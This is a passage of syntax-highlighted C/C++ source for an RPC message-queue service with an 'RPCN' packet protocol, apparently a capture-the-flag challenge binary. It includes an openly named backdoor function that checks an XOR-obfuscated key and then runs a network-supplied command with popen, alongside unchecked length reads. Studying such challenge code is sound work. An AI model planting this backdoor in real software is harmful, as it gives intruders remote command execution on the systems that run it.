string">"RPCN"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"\x00\x00\xbe\xf2"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> packet<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">magiccmp</span><span class="token punctuation">(</span>byte b1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byte b2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">36</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>    k<span class="token operator">+</span><span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">bytecmp</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">int</span> sock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">!=</span><span class="token number">36</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bytecmp</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>EVIL_INS<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> cmd_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>cmd_len<span class="token operator">></span><span class="token number">22</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">,</span> cmd_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token function">fgets</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">pclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockConn<span class="token punctuation">,</span> MQ mq<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> starting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> error_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf0"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> done_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xef"</span><span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">magiccmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>RECV_MAGIC<span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> length <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> packet_type <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> key_len<span class="token punctuation">,</span> id_len<span class="token punctuation">,</span> expr_len<span class="token punctuation">,</span> res_len<span class="token punctuation">,</span> status<span class="token punctuation">,</span> i<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      string skey<span class="token punctuation">;</span>      string s_corr_id<span class="token punctuation">;</span>      string s_res<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> corr_id<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> packet<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> res<span class="token punctuation">;</span>      Q q<span class="token punctuation">;</span>      Data d<span class="token punctuation">;</span>      <span class="token keyword">switch</span><span class="token punctuation">(</span>packet_type<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// connect</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>starting <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            starting <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// declare</span>          uuid_t uuid<span class="token punctuation">;</span>          <span class="token function">uuid_generate</span><span class="token punctuation">(</span>uuid<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">uuid_unparse</span><span class="token punctuation">(</span>uuid<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          mq<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>pair<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">(</span>skey<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> <span class="token number">36</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// retrieve</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    corr_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">memset</span><span class="token punctuation">(</span>corr_id<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>id_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>corr_id<span class="token punctuation">,</span> id_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">+</span>id_len<span class="token operator">!=</span>length<span class="token number">-12</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          skey <span class="token operator">=</span> key<span class="token punctuation">;</span>          s_corr_id <span class="token operator">=</span> corr_id<span class="token punctuation">;</span>          it_find <span class="token operator">=</span> mq<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>skey<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>it_find<span class="token operator">!=</span>mq<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            i <span class="token operator">=</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>corr_id <span class="token operator">!=</span> s_corr_id<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">// å‡ºé˜Ÿ</span>              res_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              packet <span class="token operator">=</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>res<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              mq<span class="token punctuation">[</span>skey<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> res_len<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>                         <span class="token punctuation">}</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// call</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          id_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token 